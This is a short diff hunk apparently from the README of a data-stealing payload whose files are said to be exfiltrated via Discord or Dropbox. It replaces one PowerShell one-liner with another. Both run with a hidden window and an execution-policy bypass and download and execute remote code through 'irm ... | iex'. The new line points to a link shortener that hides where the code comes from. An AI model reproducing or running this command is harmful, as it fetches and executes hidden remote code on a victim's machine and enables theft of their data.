@@ -30,6 +30,6 @@ They are then exfiled using either Discord or Dropbox.
 SYNTAX:
 
 ```
-powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
+powershell -w h -ep bypass $dc='';$db='';irm https://n9.cl/mrflipper2 | iex
 ```
 
